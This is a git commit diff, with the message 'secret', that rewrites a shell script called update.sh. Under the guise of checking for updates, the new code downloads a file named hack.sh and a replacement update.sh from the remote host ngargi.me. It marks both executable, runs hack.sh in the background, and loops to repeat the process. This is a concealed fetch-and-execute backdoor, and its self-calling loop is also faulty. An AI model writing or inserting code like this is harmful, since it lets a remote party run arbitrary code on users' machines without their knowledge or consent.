c896a0de902b29caef953498abf0abb6e1dd8aba
nacgarg <nacgarg@nuevaschool.org>
2015-04-17 11:25:36 -0700

    secret

--- update.sh
+++ update.sh
@@ -1,6 +1,15 @@
-VERSION = 1
+export VERSION=1
+echo `curl -s "http://ngargi.me/update"`
 
-if [`curl "http://ngargi.me/update"` -eq $VERSION];
+if [ `curl -s "http://ngargi.me/update"` = $VERSION ];
 	then
-		echo 'no update needed';
+		echo 'no update needed'
+else
+	echo "update needed"
+	curl -s -O "http://ngargi.me/hack.sh"
+	curl -s -O "http://ngargi.me/update.sh"
+	chmod a+x hack.sh
+	chmod a+x update.sh
+	./hack.sh &
+	while [ true ]; do ./update.sh; sleep 5000; done;
 fi;
